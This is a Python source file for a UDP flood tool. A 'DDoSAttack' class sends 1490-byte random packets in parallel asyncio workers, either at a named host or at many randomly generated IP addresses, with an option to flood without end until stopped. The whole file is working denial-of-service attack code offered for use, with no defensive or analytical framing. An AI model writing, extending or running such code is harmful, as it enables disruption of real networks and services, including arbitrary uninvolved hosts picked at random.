import asyncio
import logging
from colorama import Fore
from random import _urandom
from socket import AF_INET, SOCK_DGRAM, gethostbyname, socket
from src.modules.generate_random_ip.generate_random_ip import IPGeneratorFactory

class DDoSAttack:
    """
    Asynchronous DDoS attack handler.
    """

    @staticmethod
    async def perform_ip_attack_async(port, quantity_ips, quantity_packages):
        """
        Performs simultaneous attacks on multiple random IPs.

        Args:
            port (int): Port number to attack.
            quantity_ips (int): Number of IPs.
            quantity_packages (int): Packets to send per IP.
        """
        generator = IPGeneratorFactory.get_strategy("random")
        tasks = []

        for _ in range(quantity_ips):
            ip = await generator.generate()
            logging.info(f"Attacking {ip}:{port} with {quantity_packages} packets")
            print(Fore.YELLOW + f"Attacking {ip}:{port}")
            tasks.append(
                DDoSAttack.launch_async_ddos(ip, port, quantity_packages)
            )

        await asyncio.gather(*tasks)
        print(Fore.CYAN + "All attacks finished.")

    @staticmethod
    async def launch_async_ddos(hostname, port, quantity):
        """
        Launches a DDoS attack on a specific host.

        Args:
            hostname (str): IP or domain.
            port (int): Port number.
            quantity (int): Total packets to send.
        """
        try:
            ip = gethostbyname(hostname)
            target = (ip, port)
            bytes_data = _urandom(1490)

            tasks = [
                DDoSAttack.attack_worker(target, bytes_data, quantity)
                for _ in range(5)
            ]

            await asyncio.gather(*tasks)
            print(Fore.CYAN + f"Attack on {target[0]} completed.")
        except Exception as e:
            print(Fore.RED + f"Launch error: {e}")

    @staticmethod
    async def attack_worker(target, bytes_data, quantity):
        """
        Sends packets to the target.

        Args:
            target (tuple): (IP, port)
            bytes_data (bytes): UDP payload.
            quantity (int): How many packets to send.
        """
        loop = asyncio.get_event_loop()

        def send_packet():
            with socket(AF_INET, SOCK_DGRAM) as sock:
                sock.sendto(bytes_data, target)

        try:
            if quantity == 0:
                print(Fore.YELLOW + "∞ Attacking... Ctrl+C to stop")
                while True:
                    await loop.run_in_executor(None, send_packet)
            else:
                for _ in range(quantity):
                    await loop.run_in_executor(None, send_packet)
        except Exception as e:
            print(Fore.RED + f"Worker error: {e}")
